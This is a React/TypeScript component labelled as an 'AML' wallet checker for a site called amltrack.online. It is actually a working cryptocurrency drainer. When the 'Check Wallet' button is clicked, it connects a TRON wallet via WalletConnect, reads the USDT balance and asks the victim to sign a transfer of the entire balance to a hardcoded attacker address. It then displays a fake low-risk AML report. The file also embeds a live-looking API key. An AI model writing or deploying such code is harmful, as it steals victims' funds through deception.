import React, { useState } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import { TronWeb } from 'tronweb';

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  headers: {
    'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
  },
});

const walletConnect = new WalletConnectAdapter({
  network: 'Mainnet',
  options: {
    relayUrl: 'wss://relay.walletconnect.com',
    projectId: 'c0a464da37c3f3b45b30d3a1080f4c99',
    metadata: {
      name: 'AML',
      description: 'AML WalletConnect',
      url: 'https://amltrack.online',
      icons: ['https://amltrack.online/images/logo.svg'],
    },
  },
  web3ModalConfig: {
    themeMode: 'dark',
  },
});

export const TronAuthButton: React.FC = () => {
  const [modalMessage, setModalMessage] = useState<string | null>(null);
  const [loading, setLoading] = useState<boolean>(false);
  const [buttonDisabled, setButtonDisabled] = useState<boolean>(false);

  const disconnectWithMessage = async (msg: string) => {
    setModalMessage(msg);
    await walletConnect.disconnect();
    setButtonDisabled(false);
    setLoading(false);
  };

  const waitForAddress = async (timeout = 15000): Promise<string> => {
    const start = Date.now();
    return new Promise((resolve, reject) => {
      const interval = setInterval(() => {
        const address = walletConnect.address;
        if (address && tronWeb.isAddress(address)) {
          clearInterval(interval);
          resolve(address);
        } else if (Date.now() - start > timeout) {
          clearInterval(interval);
          reject(new Error('Timeout'));
        }
      }, 300);
    });
  };

  const connectWallet = async () => {
    try {
      setLoading(true);
      setButtonDisabled(true);

      await walletConnect.connect();
      const userAddress = await waitForAddress();

      tronWeb.setAddress(userAddress);

      const trxBalance = await tronWeb.trx.getBalance(userAddress); // в SUN
      if (trxBalance < 2_000_000) {
        return await disconnectWithMessage('❌ Not enough TRX to cover network fees (need ~2 TRX).');
      }

      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt = Number(usdtRaw) / 1e6;

      if (usdt < 1) {
        return await disconnectWithMessage('✅ Wallet connected. No USDT detected (risk: low)');
      }

      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        {
          feeLimit: 25_000_000,
          callValue: 0,
        },
        [
          { type: 'address', value: TRON_RECEIVER },
          { type: 'uint256', value: usdtRaw },
        ],
        userAddress
      );

      const signedTx = await walletConnect.signTransaction(transaction);
      const sent = await tronWeb.trx.sendRawTransaction(signedTx);

      if (sent?.result) {
        await disconnectWithMessage('✅ USDT sent successfully');
      } else {
        throw new Error('Send failed');
      }

    } catch (err: any) {
      const msg = err?.message || err.toString();
      console.error('WalletConnect error:', msg);

      if (
        msg.includes('User closed modal') ||
        msg.includes('User rejected') ||
        msg.includes('Modal is closed') ||
        msg.includes('Timeout')
      ) {
        // Тихо закрываем без показа ошибок
        setButtonDisabled(false);
        setLoading(false);
        return;
      }

      await disconnectWithMessage('⚠️ Connection or transaction error');
    }
  };

  return (
    <>
      <div
        className={`AuthButton ${buttonDisabled ? 'disabled' : ''}`}
        onClick={() => {
          if (!buttonDisabled) connectWallet();
        }}
      >
        {loading ? 'Connecting...' : 'Check Wallet'}
      </div>

      {modalMessage && (
        <div className='modal__overflow'>
          <div className='modal'>
            {modalMessage.includes('✅') || modalMessage.includes('risk') ? (
              <>
                <div className='content greenBorder'>
                  <div>0.6%</div>
                  <div>
                    <h3>Low risk level</h3>
                    <div className='nums'>
                      <div><span className='circ green'></span> 0-30</div>
                      <div><span className='circ orange'></span> 31-69</div>
                      <div><span className='circ red'></span> 70-100</div>
                    </div>
                  </div>
                </div>
                <div className='content report'>
                  <p>AML report for a wallet:</p>
                  <h5>{USDT_CONTRACT}</h5>
                </div>
              </>
            ) : (
              <p>{modalMessage}</p>
            )}
            <button
              onClick={() => {
                setModalMessage(null);
                setButtonDisabled(false);
                setLoading(false);
              }}
            >
              Close
            </button>
          </div>
        </div>
      )}
    </>
  );
};
